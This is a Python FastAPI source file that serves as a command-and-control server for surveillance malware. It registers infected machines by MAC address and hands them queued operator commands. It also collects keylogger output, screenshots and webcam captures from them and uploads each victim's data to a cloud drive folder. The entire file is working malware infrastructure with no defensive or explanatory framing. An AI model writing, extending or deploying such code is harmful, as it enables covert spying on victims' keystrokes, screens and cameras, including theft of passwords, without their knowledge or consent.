import uvicorn
import json
import os
from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse
from typing import Dict, List
import base64
from driveapi import create_folder, upload_file_from_file

app = FastAPI()
DB_NAME = 'db.json'
TEMP_FILE = 'temp'


@app.get('/')
async def root():
    with open('source_files/index.html', 'r') as file:
        return HTMLResponse(file.read())


@app.get('/db.json')
async def db_json():
    return load_db()


@app.post('/add_command')
async def add_command(mac_address: str = Form(default=None),
                      commands: str = Form(default="")):
    db = load_db()
    db[mac_address]['commands'] += commands.split(',')
    write_db(db)
    with open('source_files/commands_added.html', 'r') as file:
        return HTMLResponse(file.read())


@app.get('/first_command')
async def first_command(request: Request) -> Dict[str, List[str]]:
    db = load_db()
    mac = request.headers['MAC-Address']
    date_time = request.headers['Date']
    if db.get(mac, None) is None:
        initialize_new_client(mac, date_time, db)
        return {'commands': ['no_commands']}
    else:
        db[mac]['last_datetime'] = date_time
        write_db(db)
        return get_commands(mac_address=mac, db=db)


@app.get('/command')
async def command(request: Request) -> Dict[str, List[str]]:
    db = load_db()
    date_time = request.headers['Date']
    mac = request.headers['MAC-Address']
    db[mac]['last_datetime'] = date_time
    write_db(db)
    return get_commands(mac_address=mac, db=db)


@app.post('/keylog_data')
async def keylog(request: Request) -> None:
    await upload_file(request, 'log', 'keylogs_received', 'txt', True)


@app.post('/screenshot')
async def screenshot(request: Request) -> None:
    file_type = request.headers['Content-Type'].split('/')[1]
    await upload_file(request, 'screenshot', 'screenshots_taken', file_type, False)


@app.post('/webcam_capture')
async def webcam_capture(request: Request) -> None:
    file_type = request.headers['Content-Type'].split('/')[1]
    await upload_file(request, 'webcam', 'webcam_shots_taken', file_type, False)


async def upload_file(request: Request, filename: str, db_identifier: str,
                      file_type: str, remove_nulls: bool) -> None:
    data = await request.body()
    if remove_nulls:
        data = data.replace(b'\x00', b'')
    mac = request.headers['MAC-Address']
    db = load_db()
    title = f'{filename}{db[mac][db_identifier]}.{file_type}'
    with open(TEMP_FILE, 'wb') as f:
        f.write(data)
    db[mac][db_identifier] += 1
    write_db(db)
    upload_file_from_file(title=title, src_filename=TEMP_FILE,
                          mime_type=request.headers['Content-Type'], parent=mac)


def load_db() -> dict:
    with open(DB_NAME, 'r') as file:
        db = json.loads(file.read())
    return db


def write_db(db: dict) -> None:
    with open(DB_NAME, 'w') as file:
        file.write(json.dumps(db))


def initialize_new_client(mac_address: str, datetime: str, db: dict) -> None:
    db[mac_address] = {
        'commands': [],
        'last_datetime': datetime,
        'screenshots_taken': 0,
        'webcam_shots_taken': 0,
        'keylogs_received': 0
    }
    write_db(db)
    create_folder(mac_address)


def get_commands(mac_address: str, db: dict) -> Dict[str, List[str]]:
    commands = db[mac_address]['commands']
    if not commands:
        return {'commands': ['no_commands']}
    else:
        db[mac_address]['commands'] = []
        write_db(db)
        return {'commands': commands}


if __name__ == '__main__':
    uvicorn.run('main:app', host='0.0.0.0', port=int(os.environ.get("PORT", 30050)), workers=2, debug=True)
# uvicorn main:app --reload
